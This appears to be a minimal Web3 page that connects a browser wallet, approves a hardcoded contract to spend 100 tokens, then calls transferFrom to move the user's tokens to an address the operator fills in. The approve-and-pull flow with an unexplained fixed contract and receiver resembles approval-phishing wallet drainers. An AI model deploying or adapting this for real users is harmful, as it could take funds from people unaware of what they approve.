<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Web3 Connect Approve</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
</head>

<body>

<h2>Web3 DApp</h2>

<button onclick="connectWallet()">Connect Wallet</button>
<button onclick="approveToken()">Approve</button>
<button onclick="pullToken()">TransferFrom</button>

<script>
let provider;
let signer;

// ===== CHANGE THESE =====
const tokenAddress = "TOKEN_ADDRESS"; 
const pullerContract = "0x578b86b3d51ff707a3b4e1272effcd03979069e1";
const receiverAddress = "RECEIVER_ADDRESS";

// token approve ABI
const tokenABI = [
  "function approve(address spender,uint256 amount) public returns(bool)"
];

// pull contract ABI
const pullABI = [
  "function transferFrom(address sender,address recipient,uint256 amount) public returns(bool)"
];

async function connectWallet(){
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    alert("Wallet Connected");
}

async function approveToken(){
    const token = new ethers.Contract(tokenAddress, tokenABI, signer);
    const amount = ethers.utils.parseUnits("100", 6);

    const tx = await token.approve(pullerContract, amount);
    await tx.wait();
    alert("Approved");
}

async function pullToken(){
    const contract = new ethers.Contract(pullerContract, pullABI, signer);
    const user = await signer.getAddress();
    const amount = ethers.utils.parseUnits("100", 6);

    const tx = await contract.transferFrom(user, receiverAddress, amount);
    await tx.wait();

    alert("Transfer Done");
}
</script>

</body>
</html>
